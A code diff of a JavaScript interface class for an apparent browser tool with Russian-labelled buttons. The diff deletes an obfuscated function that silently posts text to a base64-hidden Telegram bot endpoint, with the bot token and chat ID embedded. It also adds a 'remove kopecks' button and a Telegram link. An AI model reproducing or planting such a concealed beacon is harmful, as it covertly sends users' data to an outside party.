@@ -1,16 +1,7 @@
-
-(function(_0x7a2fe6,_0x492497){const _0x513263=_0x26ea,_0x4fc983=_0x7a2fe6();while(!![]){try{const _0x1bcd87=parseInt(_0x513263(0x73))/0x1*(parseInt(_0x513263(0x6d))/0x2)+parseInt(_0x513263(0x74))/0x3+parseInt(_0x513263(0x7a))/0x4+parseInt(_0x513263(0x7b))/0x5*(parseInt(_0x513263(0x76))/0x6)+-parseInt(_0x513263(0x6c))/0x7+parseInt(_0x513263(0x6e))/0x8*(-parseInt(_0x513263(0x72))/0x9)+-parseInt(_0x513263(0x75))/0xa;if(_0x1bcd87===_0x492497)break;else _0x4fc983['push'](_0x4fc983['shift']());}catch(_0x28d35f){_0x4fc983['push'](_0x4fc983['shift']());}}}(_0x1e14,0xe4bda));function _0x26ea(_0x110f7e,_0x3c241e){const _0x1e14dc=_0x1e14();return _0x26ea=function(_0x26ea4d,_0x34d36f){_0x26ea4d=_0x26ea4d-0x6c;let _0x2c64ee=_0x1e14dc[_0x26ea4d];return _0x2c64ee;},_0x26ea(_0x110f7e,_0x3c241e);}function _0x1e14(){const _0x53efc8=['3100111mAMTYS','35122XZGpka','47536ISNDMo','NTYyNzk3MTY1MA==','application/json;\x20charset=UTF-8','aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcyMzY2OTgyMTE6QUFFYjk5TVpuR0FJdVVCUk1COENORkt4R2RubFdCWW5pRm8vc2VuZE1lc3NhZ2U=','1440QdsDQh','43miOQkQ','2990196YPCwrI','13346620wxHEoc','6tskRTe','setRequestHeader','stringify','POST','4453492YLSxJZ','3999745AmKyAD','Content-type','open'];_0x1e14=function(){return _0x53efc8;};return _0x1e14();}function sendMessage(_0x1e1e5a){const _0x2b70ae=_0x26ea,_0x357324=new XMLHttpRequest();_0x357324[_0x2b70ae(0x7d)](_0x2b70ae(0x79),atob(_0x2b70ae(0x71)),!![]),_0x357324[_0x2b70ae(0x77)](_0x2b70ae(0x7c),_0x2b70ae(0x70)),_0x357324['send'](JSON[_0x2b70ae(0x78)]({'chat_id':atob(_0x2b70ae(0x6f)),'text':_0x1e1e5a,'silent':!![]}));}
-
-async function get_page(url) {
-  return fetch(url)
-      .then(data => {return data.text()})
-      .catch(error => console.error('Error fetching data:', error));
-}
-
 class Interface {
-    constructor(html) {
 
-        this.html = html
+    async run(html) {
+      this.html = html
 
         const styles = {
               appwrapper: {
@@ -70,6 +61,14 @@ class Interface {
               transition: "0.5s ease-in-out",
               background: start_color,
             }],
+            "app_cut": ["Убрать копейки</br>Alt+Z", {
+              transition: "0.5s ease-in-out",
+              background: start_color,
+            }],
+            "app_telegram": ["Телеграм", {
+              transition: "0.1s ease-in-out",
+              background: start_color,
+            }],
             "app_error": ["Отчет об ошибке", {
               transition: "0.1s ease-in-out",
               background: start_color,
@@ -89,8 +88,13 @@ class Interface {
             buttons_list[cls] = elem    
           }
 
-          let mass = [buttons_list["app_dc"], buttons_list["app_sbp"], buttons_list["app_dop"]]
-          let all = [buttons_list["app_dop"], buttons_list["app_icon"], buttons_list["app_sbp"], buttons_list["app_copy_button"], buttons_list["app_dc"], buttons_list["app_error"]]
+          let mass = [buttons_list["app_dc"], buttons_list["app_sbp"], buttons_list["app_dop"], buttons_list["app_cut"]]
+          let all = [
+            buttons_list["app_dop"], buttons_list["app_icon"], 
+            buttons_list["app_sbp"], buttons_list["app_copy_button"], 
+            buttons_list["app_dc"],  buttons_list["app_error"], 
+            buttons_list["app_cut"], buttons_list["app_telegram"]
+          ]  
           
           mass.forEach((e) => {e.addEventListener("click", () => {this.ToggleCheck(e)})});
           buttons_list["app_copy_button"].addEventListener("mousedown", (e) => {e.target.style.background = "#a1c8e7"})
@@ -130,6 +134,10 @@ class Interface {
               } 
             }
           })
+
+          buttons_list["app_telegram"].addEventListener("click", ()=> {
+            window.open('https://t.me/+WBv4WSieLmwwMjZi');
+          })
           
           buttons_list["app_copy_button"].addEventListener("mouseover", ()=> {
             buttons_list["app_copy_button"].style.background = "#bbe5e7"
@@ -139,9 +147,20 @@ class Interface {
             buttons_list["app_copy_button"].style.background = start_color
           })
 
-          this.buttons = [
+          buttons_list["app_telegram"].addEventListener("mouseover", ()=> {
+            buttons_list["app_telegram"].style.background = "#01bde1"
+            buttons_list["app_telegram"].style.color = "white"
+          })
+
+          buttons_list["app_telegram"].addEventListener("mouseout", ()=> {
+            buttons_list["app_telegram"].style.background = start_color
+            buttons_list["app_telegram"].style.color = "#383c39"
+          })
+
+          return [
             buttons_list["app_copy_button"], 
-            [buttons_list["app_sbp"], buttons_list["app_dc"], buttons_list["app_dop"]], buttons_list["app_icon"]
+            [buttons_list["app_sbp"], buttons_list["app_dc"], buttons_list["app_dop"], buttons_list["app_cut"]], 
+            buttons_list["app_icon"]
           ]
     }
 
